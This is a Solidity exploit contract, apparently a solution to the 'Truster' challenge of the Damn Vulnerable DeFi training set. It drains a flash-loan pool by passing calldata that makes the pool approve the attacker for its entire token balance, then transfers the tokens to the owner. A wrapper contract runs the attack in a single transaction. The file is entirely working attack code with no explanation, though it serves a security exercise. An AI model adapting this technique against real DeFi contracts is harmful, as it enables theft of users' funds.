// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackTruster {
    TrusterLenderPool public pool;
    address public owner;
    address public poolAddress;

    constructor(address payable _poolAddress, address _owner) {
        poolAddress = _poolAddress;
        pool = TrusterLenderPool(poolAddress);
        owner = _owner;
    }

    function attack() external {
        IERC20 dvt = pool.damnValuableToken();
        uint256 balancePoolBefore = dvt.balanceOf(poolAddress);
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            balancePoolBefore
        );
        pool.flashLoan(0, address(this), address(dvt), data);
        dvt.transferFrom(poolAddress, owner, balancePoolBefore);
    }
}

contract SingleAttackTruster {
    AttackTruster attackContract;

    constructor(address payable poolAddress) {
        attackContract = new AttackTruster(poolAddress, msg.sender);
        attackContract.attack();
    }
}
